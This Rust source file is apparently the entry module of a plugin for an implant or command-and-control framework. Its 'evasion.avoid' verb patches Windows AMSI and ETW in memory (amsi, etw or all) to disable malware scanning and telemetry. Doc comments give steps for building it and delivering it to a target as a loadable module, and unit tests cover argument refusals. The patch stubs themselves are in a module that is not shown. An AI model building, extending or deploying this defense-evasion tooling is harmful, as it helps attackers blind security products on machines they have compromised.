//! The defense-evasion family's first module (architecture.md Sec
//! 5.4): `evasion.avoid`, the module-layer implementation behind the
//! kernel's placeholder verb -- the placeholder carried the contract
//! and the `modifies-defenses` OPSEC flag; this plugin carries the
//! act, and every dispatched patch rides the task audit dispatched
//! actions already enter.
//!
//! The grammar is one word: the target the task patches (`amsi`,
//! `etw`, or `all`). A bare task refuses teaching the three -- a
//! sensitive act names its target rather than guessing a default.
//! The patch lives in this process's memory alone: nothing lands on
//! disk, the effect dies with the process, and a second run reports
//! `already patched` rather than writing again. The stubs are x64
//! code in v1.0; a non-x64 Windows build refuses naming the
//! architecture instead of writing encodings it cannot stand behind.
//!
//! Build for a Windows target (`cargo build --release --target
//! x86_64-pc-windows-gnu`), deliver the cdylib's bytes as a
//! `module.load avoid` task's content, then task `evasion.avoid` like
//! any compiled verb. A non-Windows build compiles for the lane and
//! refuses the verb at run time: the technique has no entry points to
//! patch there.

mod arguments;
// The target table, stubs, and idempotence half are pure and
// host-tested, but only the Windows execution calls them -- the same
// not(windows) allowance the family's other pure halves carry, stated
// once at the module the whole tree of it belongs to.
#[cfg_attr(not(windows), allow(dead_code))]
mod patch;

use arguments::Arguments;
use rod_plugin_sdk::{rod_plugin, Plugin, Verb};

pub struct Avoid;

impl Plugin for Avoid {
    fn name(&self) -> &'static str {
        "avoid"
    }

    fn verbs(&self) -> Vec<Verb> {
        vec![Verb::new("evasion.avoid", avoid)]
    }
}

fn avoid(input: &str) -> Result<String, String> {
    let arguments = arguments::parse(input)?;
    arguments::validate(&arguments)?;
    execute(&arguments)
}

/// The Windows execution: every target the word names, one row each,
/// in the table's order so two runs of one word report alike.
#[cfg(windows)]
fn execute(arguments: &Arguments) -> Result<String, String> {
    let word = arguments.target.as_deref().unwrap_or_default();
    let targets =
        patch::targets_of(word).expect("the grammar validated the word against the same table");
    Ok(targets
        .iter()
        .map(patch::patch)
        .collect::<Vec<String>>()
        .join("\n"))
}

/// The technique has no entry points off Windows; the manifest's
/// targets keep the module off other loads, and this refusal keeps a
/// stray dispatch honest about why it cannot run.
#[cfg(not(windows))]
fn execute(_arguments: &Arguments) -> Result<String, String> {
    Err(format!(
        "evasion.avoid: patching the scan and telemetry entry points is a Windows \
         technique; this build runs on {}",
        std::env::consts::OS
    ))
}

rod_plugin!(Avoid);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_bare_task_refuses_naming_the_three() {
        // A sensitive act names its target: the bare task refuses
        // teaching the words rather than guessing a default.
        let refusal = avoid("").expect_err("the bare task refuses");
        assert!(refusal.contains("amsi, etw, all"), "{refusal}");
    }

    #[test]
    fn a_bad_word_refuses_before_anything_runs() {
        assert!(avoid("edr").is_err());
        assert!(avoid("amsi etw").is_err());
    }

    #[test]
    fn off_windows_the_worded_task_refuses_naming_the_platform() {
        #[cfg(not(windows))]
        {
            let refusal = avoid("all").expect_err("off Windows the verb refuses");
            assert!(refusal.contains("Windows technique"), "{refusal}");
            assert!(refusal.contains(std::env::consts::OS), "{refusal}");
        }
    }
}
